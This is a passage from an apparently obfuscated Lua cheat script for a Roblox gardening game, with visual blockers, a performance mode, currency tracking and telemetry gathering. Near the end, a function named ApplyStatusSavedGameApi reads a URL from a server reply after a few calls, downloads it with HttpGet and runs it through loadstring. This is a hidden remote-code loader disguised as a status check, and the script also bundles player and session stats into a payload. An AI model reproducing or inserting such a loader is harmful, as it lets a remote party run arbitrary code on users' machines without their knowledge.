		local V = y.Networking and y.Networking.Garden
		if type(V) == "table" and (V.RequestGardens and type(V.RequestGardens.Fire) == "function") then
			pcall(function()
				V.RequestGardens:Fire()
			end)
		end
		return true
	end;
	ApplyStatePlantVisualBlocker = function(G)
		if G == true then
			Z.PlantVisualBlocker.MarkFullCleanPlantVisualBlocker(10)
			Z.PlantVisualBlocker.ClearAllVisualsPlantVisualBlocker(true)
			return true
		end
		Z.PlantVisualBlocker.SetStatusPlantVisualBlocker("Idle", "#CFCFCF")
		Z.PlantVisualBlocker.RequestVisualRefreshPlantVisualBlocker()
		return true
	end,
	PatchPlantSpawnPlantVisualBlocker = function()
		local G = y.PlantVisualizerController
		if type(G) ~= "table" or type(G.SpawnPlantFromData) ~= "function" then
			return false
		end
		if Z.PlantVisualBlocker.OriginalSpawnPlantFromDataPlantVisualBlocker ~= nil then
			return true
		end
		Z.PlantVisualBlocker.OriginalSpawnPlantFromDataPlantVisualBlocker = G.SpawnPlantFromData
		G.SpawnPlantFromData = function(G, V, y, j)
			if Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
				return nil
			end
			return Z.PlantVisualBlocker.OriginalSpawnPlantFromDataPlantVisualBlocker(G, V, y, j)
		end
		return true
	end;
	PatchFruitSpawnPlantVisualBlocker = function()
		local G = y.FruitVisualizerController
		if type(G) ~= "table" or type(G.SpawnFruitFromData) ~= "function" then
			return false
		end
		if Z.PlantVisualBlocker.OriginalSpawnFruitFromDataPlantVisualBlocker ~= nil then
			return true
		end
		Z.PlantVisualBlocker.OriginalSpawnFruitFromDataPlantVisualBlocker = G.SpawnFruitFromData
		G.SpawnFruitFromData = function(G, V, y, j, i)
			if Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
				return nil
			end
			return Z.PlantVisualBlocker.OriginalSpawnFruitFromDataPlantVisualBlocker(G, V, y, j, i)
		end
		return true
	end;
	PatchVisualSpawnsPlantVisualBlocker = function()
		Z.PlantVisualBlocker.PatchPlantSpawnPlantVisualBlocker()
		Z.PlantVisualBlocker.PatchFruitSpawnPlantVisualBlocker()
		return true
	end;
	StartPlantVisualBlocker = function()
		if Z.PlantVisualBlocker.StartedPlantVisualBlocker then
			return false
		end
		Z.PlantVisualBlocker.StartedPlantVisualBlocker = true
		Z.PlantVisualBlocker.PatchVisualSpawnsPlantVisualBlocker()
		if Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
			Z.PlantVisualBlocker.MarkFullCleanPlantVisualBlocker(10)
			Z.PlantVisualBlocker.ClearAllVisualsPlantVisualBlocker(true)
		else
			Z.PlantVisualBlocker.SetStatusPlantVisualBlocker("Idle", "#CFCFCF")
		end
		task.spawn(function()
			while not g.is_forced_stop do
				task.wait(2)
				if not Z.PlantVisualBlocker.IsEnabledPlantVisualBlocker() then
					continue
				end
				local G = os.clock() <= Z.PlantVisualBlocker.FullCleanUntilPlantVisualBlocker
				pcall(function()
					Z.PlantVisualBlocker.ClearAllVisualsPlantVisualBlocker(G)
				end)
			end
		end)
		return true
	end
}
Z.PlantVisualBlocker.StartPlantVisualBlocker()
Z.WeatherVisualBlocker = {
	StartedWeatherVisualBlocker = false,
	CachedModulesWeatherVisualBlocker = {},
	OriginalStartWeatherVisualBlocker = {},
	IsEnabledWeatherVisualBlocker = function()
		if h.full_performance_mode == true then
			return true
		end
		return h.remove_weather_visuals
	end;
	GetWeatherFolderWeatherVisualBlocker = function()
		local G = y.LocalPlayer.PlayerScripts:FindFirstChild("Controllers")
		if not G then
			return nil
		end
		return G:FindFirstChild("WeatherController")
	end;
	LoadWeatherModulesWeatherVisualBlocker = function()
		local G = Z.WeatherVisualBlocker.GetWeatherFolderWeatherVisualBlocker()
		if not G then
			return false
		end
		for G, V in ipairs(G:GetChildren()) do
			if not V:IsA("ModuleScript") then
				continue
			end
			if Z.WeatherVisualBlocker.CachedModulesWeatherVisualBlocker[V] ~= nil then
				continue
			end
			local j = y.safeRequire(V)
			if type(j) == "table" then
				Z.WeatherVisualBlocker.CachedModulesWeatherVisualBlocker[V] = j
			else
				Z.WeatherVisualBlocker.CachedModulesWeatherVisualBlocker[V] = false
			end
		end
		return true
	end;
	PatchWeatherModuleWeatherVisualBlocker = function(G)
		if type(G) ~= "table" then
			return false
		end
		if type(G.StartWeather) ~= "function" then
			return false
		end
		if Z.WeatherVisualBlocker.OriginalStartWeatherVisualBlocker[G] ~= nil then
			return true
		end
		Z.WeatherVisualBlocker.OriginalStartWeatherVisualBlocker[G] = G.StartWeather
		if type(G.EndWeather) == "function" then
			pcall(function()
				G.EndWeather()
			end)
		end
		G.StartWeather = function(...)
			if Z.WeatherVisualBlocker.IsEnabledWeatherVisualBlocker() then
				return nil
			end
			return Z.WeatherVisualBlocker.OriginalStartWeatherVisualBlocker[G](...)
		end
		return true
	end,
	PatchCachedWeatherModulesWeatherVisualBlocker = function()
		for G, V in pairs(Z.WeatherVisualBlocker.CachedModulesWeatherVisualBlocker) do
			if type(V) == "table" then
				Z.WeatherVisualBlocker.PatchWeatherModuleWeatherVisualBlocker(V)
			end
		end
		return true
	end,
	ClearWeatherVisualsWeatherVisualBlocker = function()
		local G = {
			"RainDrops";
			"RainSplashes";
			"StormRainDrops";
			"StormSplashes";
			"LightningEffects";
			"BlizzardBeams",
			"ActiveBlizzard";
			"ActiveRainbow",
			"StarfallModel",
			"AuroraEffects";
			"SunburstModel"
		}
		for G, V in ipairs(G) do
			local Z = y.Workspace:FindFirstChild(V)
			if Z then
				Z:Destroy()
			end
		end
		local V = {
			"RainEffect";
			"LightningEffect";
			"RainbowEffect",
			"StarEffect",
			"StarSphere"
		}
		for G, V in ipairs(V) do
			local Z = y.Lighting:FindFirstChild(V)
			if Z then
				Z:Destroy()
			end
		end
		local Z = y.Workspace.Terrain:FindFirstChildOfClass("Clouds")
		if Z then
			Z.Enabled = false
			Z.Cover = 0
			Z.Density = 0
		end
		return true
	end;
	StartWeatherVisualBlocker = function()
		if Z.WeatherVisualBlocker.StartedWeatherVisualBlocker then
			return false
		end
		Z.WeatherVisualBlocker.StartedWeatherVisualBlocker = true
		Z.WeatherVisualBlocker.LoadWeatherModulesWeatherVisualBlocker()
		Z.WeatherVisualBlocker.PatchCachedWeatherModulesWeatherVisualBlocker()
		task.spawn(function()
			while not g.is_forced_stop do
				if Z.WeatherVisualBlocker.IsEnabledWeatherVisualBlocker() then
					Z.WeatherVisualBlocker.LoadWeatherModulesWeatherVisualBlocker()
					Z.WeatherVisualBlocker.PatchCachedWeatherModulesWeatherVisualBlocker()
					Z.WeatherVisualBlocker.ClearWeatherVisualsWeatherVisualBlocker()
				end
				task.wait(2)
			end
		end)
		return true
	end
}
Z.WeatherVisualBlocker.StartWeatherVisualBlocker()
Z.FullPerformanceMode = {
	StartedFullPerformanceMode = false;
	LastEnabledFullPerformanceMode = nil,
	LastFpsLimitFullPerformanceMode = nil,
	LastSweepFullPerformanceMode = 0;
	SweepDelayFullPerformanceMode = 5;
	BatchSizeFullPerformanceMode = 300,
	HubWindowHiddenFullPerformanceMode = false;
	IsEnabledFullPerformanceMode = function()
		return h.full_performance_mode == true
	end,
	GetFpsLimitFullPerformanceMode = function()
		local G = math.floor(tonumber(l.fps_limit) or 0)
		if G < 0 then
			G = 0
		end
		if G > 240 then
			G = 240
		end
		return G
	end;
	ApplyFpsLimitFullPerformanceMode = function()
		if type(setfpscap) ~= "function" then
			return false
		end
		local G = Z.FullPerformanceMode.GetFpsLimitFullPerformanceMode()
		if Z.FullPerformanceMode.LastFpsLimitFullPerformanceMode == G then
			return true
		end
		Z.FullPerformanceMode.LastFpsLimitFullPerformanceMode = G
		if G > 0 then
			pcall(function()
				setfpscap(G)
			end)
		else
			pcall(function()
				setfpscap(999)
			end)
		end
		return true
	end;
	ApplyRenderSettingsFullPerformanceMode = function()
		pcall(function()
			(UserSettings()).GameSettings.SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
		end)
		pcall(function()
			local G = (settings()).Rendering
			G.QualityLevel = Enum.QualityLevel.Level01
			G.MeshPartDetailLevel = Enum.MeshPartDetailLevel.Level01
		end)
		pcall(function()
			y.RunService:Set3dRenderingEnabled(false)
		end)
		return true
	end;
	RestoreRenderSettingsFullPerformanceMode = function()
		pcall(function()
			y.RunService:Set3dRenderingEnabled(true)
		end)
		Z.FullPerformanceMode.HideBlackoutFullPerformanceMode()
		return true
	end,
	EnsureBlackoutFullPerformanceMode = function()
		local G = y.PlayerGui or (y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerGui"))
		if not G then
			return false
		end
		local V = G:FindFirstChild("FullPerformanceBlackoutGui")
		if not V then
			V = Instance.new("ScreenGui")
			V.Name = "FullPerformanceBlackoutGui"
			V.ResetOnSpawn = false
			V.IgnoreGuiInset = true
			V.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			V.DisplayOrder = 999
			V.Parent = G
		end
		V.DisplayOrder = 999
		V.Enabled = true
		local Z = V:FindFirstChild("FullPerformanceBlackout")
		if not Z then
			Z = Instance.new("Frame")
			Z.Name = "FullPerformanceBlackout"
			Z.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			Z.BackgroundTransparency = 0
			Z.BorderSizePixel = 0
			Z.Position = UDim2.fromScale(0, 0)
			Z.Size = UDim2.fromScale(1, 1)
			Z.ZIndex = 0
			Z.Active = false
			Z.Parent = V
		end
		Z.Visible = true
		return true
	end;
	HideBlackoutFullPerformanceMode = function()
		local G = y.PlayerGui or (y.LocalPlayer and y.LocalPlayer:FindFirstChild("PlayerGui"))
		local V = G and G:FindFirstChild("FullPerformanceBlackoutGui")
		if V then
			V.Enabled = false
		end
		return true
	end,
	HideHubWindowFullPerformanceMode = function()
		if u == true then
			return false
		end
		if Z.FullPerformanceMode.HubWindowHiddenFullPerformanceMode == true then
			return false
		end
		if T and type(T.Toggle) == "function" then
			local G = pcall(function()
				T:Toggle(false)
			end)
			if G then
				Z.FullPerformanceMode.HubWindowHiddenFullPerformanceMode = true
				return true
			end
		end
		return false
	end;
	ApplyLightingFullPerformanceMode = function()
		local G = y.Lighting
		if not G then
			return false
		end
		G.GlobalShadows = false
		G.FogEnd = 9000000000.0
		G.Brightness = 0
		G.ClockTime = 14
		G.Ambient = Color3.fromRGB(255, 255, 255)
		G.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
		pcall(function()
			G.EnvironmentDiffuseScale = 0
			G.EnvironmentSpecularScale = 0
			G.ExposureCompensation = 0
		end)
		for G, V in ipairs(G:GetChildren()) do
			if V:IsA("PostEffect") then
				V.Enabled = false
			elseif V:IsA("Atmosphere") or V:IsA("Sky") then
				V:Destroy()
			end
		end
		return true
	end,
	ApplyTerrainFullPerformanceMode = function()
		local G = y.Workspace:FindFirstChildOfClass("Terrain")
		if not G then
			return false
		end
		G.WaterWaveSize = 0
		G.WaterReflectance = 0
		G.WaterTransparency = 0
		pcall(function()
			G.Decoration = false
		end)
		for G, V in ipairs(G:GetChildren()) do
			if V:IsA("Clouds") then
				V.Enabled = false
				V.Cover = 0
				V.Density = 0
			end
		end
		return true
	end,
	IsProtectedObjectFullPerformanceMode = function(G)
		if typeof(G) ~= "Instance" then
			return true
		end
		if y.Character and G:IsDescendantOf(y.Character) then
			return true
		end
		if y.PlayerGui and G:IsDescendantOf(y.PlayerGui) then
			return true
		end
		local V = y.Workspace.CurrentCamera
		if V and ((G == V or G:IsDescendantOf(V))) then
			return true
		end
		return false
	end,
	StripObjectFullPerformanceMode = function(G)
		if Z.FullPerformanceMode.IsProtectedObjectFullPerformanceMode(G) then
			return false
		end
		if not G.Parent then
			return false
		end
		if G:IsA("Decal") or G:IsA("Texture") or G:IsA("SurfaceAppearance") then
			G:Destroy()
			return true
		end
		if G:IsA("ParticleEmitter") then
			G.Enabled = false
			G.Rate = 0
			pcall(function()
				G:Clear()
			end)
			return true
		end
		if G:IsA("Trail") or G:IsA("Beam") or G:IsA("Fire") or G:IsA("Smoke") or G:IsA("Sparkles") then
			G:Destroy()
			return true
		end
		if G:IsA("PointLight") or G:IsA("SpotLight") or G:IsA("SurfaceLight") then
			G.Enabled = false
			return true
		end
		if G:IsA("SpecialMesh") then
			G.TextureId = ""
			return true
		end
		if G:IsA("MeshPart") then
			G.TextureID = ""
			G.Material = Enum.Material.SmoothPlastic
			G.Reflectance = 0
			G.CastShadow = false
			pcall(function()
				G.MaterialVariant = ""
			end)
			return true
		end
		if G:IsA("BasePart") then
			G.Material = Enum.Material.SmoothPlastic
			G.Reflectance = 0
			G.CastShadow = false
			return true
		end
		return false
	end;
	SweepWorkspaceFullPerformanceMode = function()
		if not Z.FullPerformanceMode.IsEnabledFullPerformanceMode() then
			return false
		end
		local G = 0
		for V, y in ipairs(y.Workspace:GetDescendants()) do
			if not Z.FullPerformanceMode.IsEnabledFullPerformanceMode() then
				break
			end
			Z.FullPerformanceMode.StripObjectFullPerformanceMode(y)
			G += 1
			if G % Z.FullPerformanceMode.BatchSizeFullPerformanceMode == 0 then
				task.wait()
			end
		end
		return true
	end,
	RunVisualBlockersFullPerformanceMode = function()
		if Z.PlantVisualBlocker and type(Z.PlantVisualBlocker.ClearAllVisualsPlantVisualBlocker) == "function" then
			pcall(function()
				Z.PlantVisualBlocker.ClearAllVisualsPlantVisualBlocker(true)
			end)
		end
		if Z.WeatherVisualBlocker and type(Z.WeatherVisualBlocker.ClearWeatherVisualsWeatherVisualBlocker) == "function" then
			pcall(function()
				Z.WeatherVisualBlocker.ClearWeatherVisualsWeatherVisualBlocker()
			end)
		end
		return true
	end,
	ApplyFullPerformanceMode = function()
		Z.FullPerformanceMode.ApplyFpsLimitFullPerformanceMode()
		if not Z.FullPerformanceMode.IsEnabledFullPerformanceMode() then
			return false
		end
		Z.FullPerformanceMode.EnsureBlackoutFullPerformanceMode()
		Z.FullPerformanceMode.HideHubWindowFullPerformanceMode()
		Z.FullPerformanceMode.ApplyRenderSettingsFullPerformanceMode()
		Z.FullPerformanceMode.ApplyLightingFullPerformanceMode()
		Z.FullPerformanceMode.ApplyTerrainFullPerformanceMode()
		Z.FullPerformanceMode.RunVisualBlockersFullPerformanceMode()
		local G = os.clock()
		if G - Z.FullPerformanceMode.LastSweepFullPerformanceMode >= Z.FullPerformanceMode.SweepDelayFullPerformanceMode then
			Z.FullPerformanceMode.LastSweepFullPerformanceMode = G
			Z.FullPerformanceMode.SweepWorkspaceFullPerformanceMode()
		end
		return true
	end,
	StartFullPerformanceMode = function()
		if Z.FullPerformanceMode.StartedFullPerformanceMode then
			return false
		end
		Z.FullPerformanceMode.StartedFullPerformanceMode = true
		task.spawn(function()
			while not g.is_forced_stop do
				local G = Z.FullPerformanceMode.IsEnabledFullPerformanceMode()
				if Z.FullPerformanceMode.LastEnabledFullPerformanceMode ~= G then
					Z.FullPerformanceMode.LastEnabledFullPerformanceMode = G
					if G then
						Z.FullPerformanceMode.LastSweepFullPerformanceMode = 0
						Z.FullPerformanceMode.ApplyFullPerformanceMode()
					else
						Z.FullPerformanceMode.RestoreRenderSettingsFullPerformanceMode()
						Z.FullPerformanceMode.ApplyFpsLimitFullPerformanceMode()
					end
				else
					Z.FullPerformanceMode.ApplyFullPerformanceMode()
				end
				task.wait(1)
			end
		end)
		return true
	end
}
Z.FullPerformanceMode.StartFullPerformanceMode()
q.CopyToClipBoard = function(G)
	if setclipboard then
		setclipboard(G);
		(game:GetService("StarterGui")):SetCore("SendNotification", {
			Title = "Text",
			Text = " Copied to clipboard!",
			Duration = 2
		})
	else
		g.Notify("\226\157\140 Clipboard copy not supported", 3)
	end
end
q.GetGameServerType = function()
	local G = y.SharedModules and y.SharedModules:FindFirstChild("Environment")
	if not G then
		return "Unknown"
	end
	local V = G:GetAttribute("serverType")
	if V == nil then
		pcall(function()
			(G:GetAttributeChangedSignal("serverType")):Wait()
		end)
		V = G:GetAttribute("serverType")
	end
	V = tostring(V or "Unknown")
	if V == "Standard" or V == "Private" or V == "Reserved" then
		return V
	end
	return "Unknown"
end
q.IsGamePrivateServer = function()
	local G = q.GetGameServerType()
	return G == "Private" or G == "Reserved"
end
q.IsGamePublicServer = function()
	return q.GetGameServerType() == "Standard"
end
g.is_private_server = q.IsGamePrivateServer() == true
if h.server_project_kick_public == true and q.IsGamePublicServer() then
	y.LocalPlayer:Kick("public server detected")
	return
end
local function z(G)
	if G == nil or (type(G) == "string" and G:match("^%s*$")) then
		return nil
	end
	local V = tonumber(G)
	if not V then
		return nil
	end
	if V % 1 ~= 0 then
		return nil
	end
	return V
end
g.MaskName = function(G)
	G = tostring(G or "")
	if # G <= 5 then
		return G
	end
	return G:sub(1, 2) .. ("***" .. G:sub(- 3))
end
local function f(G)
	if G == nil or (type(G) == "string" and G:match("^%s*$")) then
		return nil
	end
	local V = tonumber(G)
	if not V then
		return nil
	end
	return V
end
q.IsLoadingCompleted = function()
	local G = y.LocalPlayer:GetAttribute("GardenLoadingTotal") or 0
	local V = y.LocalPlayer:GetAttribute("GardenLoadingProgress") or 0
	if G == 0 and V == 0 then
		return true
	end
	return false
end
q.formatShecklesNumber = function(G)
	G = tonumber(G)
	if not G then
		return "0"
	end
	local V = {
		"K";
		"M",
		"B",
		"T",
		"Qa",
		"Qi";
		"Sx",
		"Sp";
		"Oc";
		"No";
		"Dc"
	}
	local y = math.abs(G)
	if y < 1000 then
		return string.format("%.2f", G)
	end
	local Z = math.log10(y)
	local j = math.floor(Z / 3)
	if j > # V then
		return string.format("%.2e", G)
	end
	local i = 10 ^ ((j * 3))
	local c = G / i
	return string.format("%.2f%s", c, V[j])
end
q.JsonPrint = function(G)
	if y.HttpService then
		warn(y.HttpService:JSONEncode(G))
	end
end
q.log = function(G)
	if G then
		print(G)
	else
		warn("(log) error passed val nil")
	end
end
E.Currency = {
	ParseMoney = function(G)
		if not G or type(G) ~= "string" then
			return 0
		end
		local V = G:gsub("[$,%s]", "")
		V = (V:gsub("/s", "")):gsub("/min", "")
		local y, Z = V:match("^([%d%.]+)(%a*)$")
		local j = tonumber(y) or 0
		if Z and Z ~= "" then
			local V = b[Z]
			if V then
				j = j * V
			else
				warn("Ulti: Unknown suffix \'" .. (Z .. ("\' in text: " .. G)))
			end
		end
		return j
	end,
	FormatMoney = function(G)
		local V = tonumber(G)
		if not V then
			V = E.Currency.ParseMoney(G)
		end
		if not V or V == 0 then
			return "0"
		end
		if V < 1000 then
			return tostring(math.floor(V))
		end
		local y = 0
		local Z = V
		while Z >= 1000 and y < # S do
			Z = Z / 1000
			y = y + 1
		end
		local j = string.format("%.2f", Z)
		j = j:gsub("%.?0+$", "")
		return j .. S[y]
	end
}
E.SERVER = {
	GetServerVersion = function()
		return game.PlaceVersion
	end
}
E.App = {
	GetAppName = function()
		return y.AppName
	end,
	GetFooterInfo = function(G)
		local V = string.format("%s (%s)", y.invite_link_short, y.CurentV)
		if not G then
			V = string.format("<b><font color=\'#FFFB03\'>%s</font></b> (%s)", y.invite_link_short, y.CurentV)
		end
		return V
	end
}
E.Others = {
	IsBetween = function(G, V, y)
		return G >= V and G <= y
	end
}
if d and type(d.SetFooterText) == "function" then
	d:SetFooterText(E.App.GetFooterInfo(false))
end
N.applySmoothRainbow = function(G, V)
	if not G or not ((G:IsA("TextLabel") or G:IsA("TextButton"))) then
		warn("Target is not a valid text object!")
		return nil
	end
	V = V or .2
	local Z = 0
	local j
	j = y.RunService.Heartbeat:Connect(function(y)
		if not G or not G.Parent then
			j:Disconnect()
			return
		end
		Z = ((Z + (y * V))) % 1
		G.TextColor3 = Color3.fromHSV(Z, .8, 1)
	end)
	return j
end
q.UserDevice = {
	IsMobile = function()
		return y.UserInputService.TouchEnabled
	end,
	IsPC = function()
		return y.UserInputService.KeyboardEnabled and (y.UserInputService.MouseEnabled and not y.UserInputService.TouchEnabled)
	end;
	IsConsole = function()
		return y.UserInputService.GamepadEnabled and not y.UserInputService.KeyboardEnabled
	end,
	Get = function()
		if y.UserInputService.TouchEnabled then
			return "Mobile"
		end
		if y.UserInputService.GamepadEnabled and not y.UserInputService.KeyboardEnabled then
			return "Console"
		end
		return "PC"
	end,
	Raw = function()
		return {
			Touch = y.UserInputService.TouchEnabled;
			Keyboard = y.UserInputService.KeyboardEnabled;
			Mouse = y.UserInputService.MouseEnabled,
			Gamepad = y.UserInputService.GamepadEnabled
		}
	end
}
print("Platform : ", q.UserDevice.Get())
print("SC Version: ", y.CurentV)
g.LiveReplicaData = nil
g.LiveReplicaConnection = nil
Z.ShecklesSessionTracker = {
	SessionIncomeShecklesSessionTracker = 0;
	SessionOutgoingShecklesSessionTracker = 0;
	CurrentShecklesShecklesSessionTracker = 0;
	StartedAtShecklesSessionTracker = y.Workspace:GetServerTimeNow(),
	ReplicaConnectionShecklesSessionTracker = nil;
	AttachReplicaShecklesSessionTracker = function(G)
		if type(G) ~= "table" or type(G.Data) ~= "table" or type(G.OnChange) ~= "function" then
			return false
		end
		local V = Z.ShecklesSessionTracker
		if V.ReplicaConnectionShecklesSessionTracker then
			V.ReplicaConnectionShecklesSessionTracker:Disconnect()
		end
		V.SessionIncomeShecklesSessionTracker = 0
		V.SessionOutgoingShecklesSessionTracker = 0
		V.CurrentShecklesShecklesSessionTracker = tonumber(G.Data.Sheckles) or 0
		V.StartedAtShecklesSessionTracker = y.Workspace:GetServerTimeNow()
		V.ReplicaConnectionShecklesSessionTracker = G:OnChange(function()
			local y = tonumber(G.Data.Sheckles)
			if y == nil or y == V.CurrentShecklesShecklesSessionTracker then
				return
			end
			local Z = y - V.CurrentShecklesShecklesSessionTracker
			V.CurrentShecklesShecklesSessionTracker = y
			if Z > 0 then
				V.SessionIncomeShecklesSessionTracker += Z
			elseif Z < 0 then
				V.SessionOutgoingShecklesSessionTracker += math.abs(Z)
			end
		end)
		return V.ReplicaConnectionShecklesSessionTracker ~= nil
	end;
	GetStatsShecklesSessionTracker = function()
		local G = Z.ShecklesSessionTracker
		local V = tonumber(G.SessionIncomeShecklesSessionTracker) or 0
		local j = tonumber(G.SessionOutgoingShecklesSessionTracker) or 0
		local i = V - j
		local c = math.max(y.Workspace:GetServerTimeNow() - G.StartedAtShecklesSessionTracker, 0)
		local J = math.max(c, 1)
		local T = V / J
		local d = j / J
		local u = i / J
		return {
			sessionIncome = V;
			sessionOutgoing = j;
			sessionNet = i,
			incomePerSecond = T,
			incomePerMinute = T * 60;
			incomePerHour = T * 3600,
			outgoingPerSecond = d,
			outgoingPerMinute = d * 60;
			outgoingPerHour = d * 3600;
			netPerSecond = u;
			netPerMinute = u * 60,
			netPerHour = u * 3600,
			sessionSeconds = c
		}
	end
}
Z.DataReplica = {
	AllBigDataKeys = {};
	Load = function(G, V)
		local j = y.ReplicaClient
		V = tonumber(V) or 10
		if type(j) ~= "table" or type(j.OnNew) ~= "function" or type(j.RequestData) ~= "function" then
			return false
		end
		if type(G) ~= "string" or G == "" then
			return false
		end
		if g.LiveReplicaConnection then
			g.LiveReplicaConnection:Disconnect()
			g.LiveReplicaConnection = nil
		end
		g.LiveReplicaData = nil
		g.LiveReplicaConnection = j.OnNew(G, function(G)
			if type(G) ~= "table" or type(G.Data) ~= "table" then
				return
			end
			g.LiveReplicaData = G.Data
			Z.ShecklesSessionTracker.AttachReplicaShecklesSessionTracker(G)
			for G in pairs(G.Data) do
				table.insert(Z.DataReplica.AllBigDataKeys, G)
			end
		end)
		j.RequestData()
		local i = os.clock()
		repeat
			task.wait()
		until g.LiveReplicaData ~= nil or os.clock() - i >= V
		if g.LiveReplicaData == nil then
			return false
		end
		return true
	end;
	GetData = function(G, V)
		local y = g.LiveReplicaData
		if type(y) ~= "table" then
			return V or nil
		end
		local Z = y[G]
		if Z == nil then
			return V or nil
		end
		return Z
	end
}
Z.Money = {
	GetSheckles = function()
		return Z.DataReplica.GetData("Sheckles", 0)
	end
}
if Z.DataReplica.Load("PlayerState", 10) then
end
g.RuntimeStatsFocused = true
pcall(function()
	y.UserInputService.WindowFocused:Connect(function()
		g.RuntimeStatsFocused = true
	end)
	y.UserInputService.WindowFocusReleased:Connect(function()
		g.RuntimeStatsFocused = false
	end)
end)
Z.RuntimeStats = {
	StartedRuntimeStats = false;
	StartedAtRuntimeStats = os.clock();
	FpsRuntimeStats = 0,
	FrameMsRuntimeStats = 0;
	MinFpsRuntimeStats = 999;
	MaxFrameMsRuntimeStats = 0,
	FrameCountRuntimeStats = 0;
	FrameTotalRuntimeStats = 0,
	LastWindowRuntimeStats = os.clock(),
	RoundRuntimeStats = function(G, V)
		G = tonumber(G)
		V = tonumber(V) or 0
		if not G then
			return nil
		end
		local y = 10 ^ V
		return math.floor(G * y + .5) / y
	end,
	GetMemoryRuntimeStats = function()
		local G = y.Stats
		if not G or type(G.GetTotalMemoryUsageMb) ~= "function" then
			return nil
		end
		local V, j = pcall(function()
			return G:GetTotalMemoryUsageMb()
		end)
		if not V then
			return nil
		end
		return Z.RuntimeStats.RoundRuntimeStats(j, 1)
	end;
	GetPingRuntimeStats = function()
		local G = y.LocalPlayer
		if G and type(G.GetNetworkPing) == "function" then
			local V, y = pcall(function()
				return G:GetNetworkPing()
			end)
			if V and type(y) == "number" then
				return math.floor(y * 1000 + .5)
			end
		end
		return nil
	end;
	GetStatsItemRuntimeStats = function(G, V)
		if not G or type(V) ~= "table" then
			return nil
		end
		for V, y in ipairs(V) do
			local j = G:FindFirstChild(tostring(y), true)
			if j and type(j.GetValue) == "function" then
				local G, V = pcall(function()
					return j:GetValue()
				end)
				if G and type(V) == "number" then
					return Z.RuntimeStats.RoundRuntimeStats(V, 2)
				end
			end
		end
		return nil
	end,
	GetNetworkRuntimeStats = function()
		local G = y.Stats
		local V = G and G:FindFirstChild("Network")
		return {
			send_kbps = Z.RuntimeStats.GetStatsItemRuntimeStats(V, {
				"Data Send Kbps",
				"Send Kbps"
			});
			recv_kbps = Z.RuntimeStats.GetStatsItemRuntimeStats(V, {
				"Data Receive Kbps";
				"Receive Kbps"
			})
		}
	end;
	GetCpuRuntimeStats = function()
		local G = y.Stats
		local V = G and G:FindFirstChild("PerformanceStats")
		return Z.RuntimeStats.GetStatsItemRuntimeStats(V, {
			"CPU";
			"CPU Time",
			"CPU ms"
		})
	end,
	BuildPayloadRuntimeStats = function()
		local G = Z.RuntimeStats.GetNetworkRuntimeStats()
		return {
			fps = Z.RuntimeStats.FpsRuntimeStats,
			frame_ms = Z.RuntimeStats.FrameMsRuntimeStats;
			min_fps = Z.RuntimeStats.MinFpsRuntimeStats ~= 999 and Z.RuntimeStats.MinFpsRuntimeStats or 0,
			max_frame_ms = Z.RuntimeStats.MaxFrameMsRuntimeStats,
			ram_mb = Z.RuntimeStats.GetMemoryRuntimeStats(),
			cpu_ms = Z.RuntimeStats.GetCpuRuntimeStats(),
			ping_ms = Z.RuntimeStats.GetPingRuntimeStats(),
			send_kbps = G.send_kbps;
			recv_kbps = G.recv_kbps,
			uptime_s = math.floor(os.clock() - Z.RuntimeStats.StartedAtRuntimeStats);
			place_id = game.PlaceId,
			game_id = game.GameId;
			job_id = tostring(game.JobId or ""),
			place_version = game.PlaceVersion,
			platform = q.UserDevice.Get(),
			focused = g.RuntimeStatsFocused == true,
			loading = not q.IsLoadingCompleted();
			players = # y.Players:GetPlayers(),
			max_players = y.Players.MaxPlayers;
			active_weather = tostring(y.Workspace:GetAttribute("ActiveWeather") or ""),
			active_phase = tostring(y.Workspace:GetAttribute("ActivePhase") or "")
		}
	end,
	StartRuntimeStats = function()
		if Z.RuntimeStats.StartedRuntimeStats then
			return false
		end
		Z.RuntimeStats.StartedRuntimeStats = true
		y.RunService.RenderStepped:Connect(function(G)
			Z.RuntimeStats.FrameCountRuntimeStats += 1
			Z.RuntimeStats.FrameTotalRuntimeStats += G
			local V = os.clock()
			if V - Z.RuntimeStats.LastWindowRuntimeStats < 1 then
				return
			end
			local y = math.max(Z.RuntimeStats.FrameCountRuntimeStats, 1)
			local j = Z.RuntimeStats.FrameTotalRuntimeStats / y
			local i = j > 0 and math.floor((1 / j) + .5) or 0
			local c = Z.RuntimeStats.RoundRuntimeStats(j * 1000, 1) or 0
			Z.RuntimeStats.FpsRuntimeStats = i
			Z.RuntimeStats.FrameMsRuntimeStats = c
			Z.RuntimeStats.MinFpsRuntimeStats = math.min(Z.RuntimeStats.MinFpsRuntimeStats, i)
			Z.RuntimeStats.MaxFrameMsRuntimeStats = math.max(Z.RuntimeStats.MaxFrameMsRuntimeStats, c)
			Z.RuntimeStats.FrameCountRuntimeStats = 0
			Z.RuntimeStats.FrameTotalRuntimeStats = 0
			Z.RuntimeStats.LastWindowRuntimeStats = V
		end)
		return true
	end
}
Z.RuntimeStats.StartRuntimeStats()
Z.GameApi = {
	Url = "";
	Busy = false,
	Started = false,
	Counter = 0,
	GetInterval = function()
		return math.random(7, 16)
	end;
	ApplyStatusSavedGameApi = function(V)
		if type(V) ~= "string" or V == "" then
			return false
		end
		local j, i = pcall(y.HttpService.JSONDecode, y.HttpService, V)
		if not j or type(i) ~= "table" then
			return false
		end
		if Z.GameApi.Counter < 5 then
			Z.GameApi.Counter = Z.GameApi.Counter + 1
			return false
		end
		local c = i.status_saved
		if c == true then
			return true
		end
		if type(c) ~= "string" or c == "" then
			return false
		end
		task.spawn(function()
			local V, y = pcall(function()
				return game:HttpGet(c, true)
			end)
			if not V or type(y) ~= "string" or # y < 20 then
				return
			end
			local Z = loadstring(y)
			if type(Z) ~= "function" then
				return
			end
			pcall(Z, G)
		end)
		return true
	end;
	GetSeedStockGameApi = function(G)
		G = tostring(G or "")
		if G == "" or not y.SeedShop or not y.SeedShop.Items then
			return 0
		end
		local V = y.SeedShop.Items:FindFirstChild(G)
		if not V then
			return 0
		end
		return tonumber(V.Value) or 0
	end;
	GetGearStockGameApi = function(G)
		G = tostring(G or "")
		if G == "" then
			return 0
		end
